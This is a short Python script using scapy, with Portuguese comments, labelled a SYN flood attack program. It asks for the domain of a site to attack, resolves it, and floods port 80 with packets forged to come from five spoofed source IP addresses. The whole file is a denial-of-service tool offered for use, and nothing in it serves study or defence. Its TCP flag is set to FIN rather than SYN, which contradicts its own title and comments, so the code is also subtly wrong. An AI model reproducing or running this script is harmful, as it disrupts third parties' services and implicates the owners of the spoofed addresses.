from scapy.layers.inet import IP, TCP
from time import sleep
from scapy.all import *

print('\033[1;32m {:-^50}'.format('PROGRAMA ATAQUE SYNFLOOD'))

#  msoc é o ip de destino, portades é a porta de destino
def dossynFlood(msoc, portades):
    #  Endereços IP aleatoriamente falsos
    srcList = ['74.20.97.76', '46.149.102.9', '98.61.221.23','39.232.63.165','217.22.133.203']
    # Determine o número de porta
    for sPort in range(1058, 47808):
        index = random.randrange(5)
        # Construi um pacote IP / TCP para envio
        ipcamada = IP(src=srcList[index], dst=msoc)
        tcpcamda = TCP(sport=sPort, dport=portades, flags='F')
        pacote = ipcamada / tcpcamda
        send(pacote)
sleep(2)
dominio = input('\033[1;32m FORNEÇA O ENDEREÇO DO SITE PARA O ATAQUE SYN FLOOD:  ')  #Digite nome de domínio que você deseja atacar
msoc = socket.gethostbyname(dominio)  #Método socket para obter o endereço ip do nome de domínio
print(f'\n{msoc}')
portades = 80  #Número da porta para transmissão de rede
dossynFlood(msoc, portades)  #Chamada da função Syn
#Geralmente, o envio continuará por alguns minutos.